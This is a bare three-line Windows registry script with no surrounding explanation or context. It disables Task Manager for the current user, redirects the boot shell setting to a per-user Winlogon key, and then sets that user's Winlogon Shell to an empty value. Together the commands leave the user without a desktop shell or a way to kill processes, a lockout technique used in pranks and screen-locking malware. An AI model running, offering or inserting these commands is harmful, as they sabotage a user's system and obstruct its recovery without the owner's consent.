REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
REG add HKLM\Software\Microsoft\Windows NT\CurrentVersion\IniFileMapping\system.ini\boot /v Shell /t REG_SZ /d "USR:Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /f
REG add HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon /v Shell /t REG_SZ /d ""
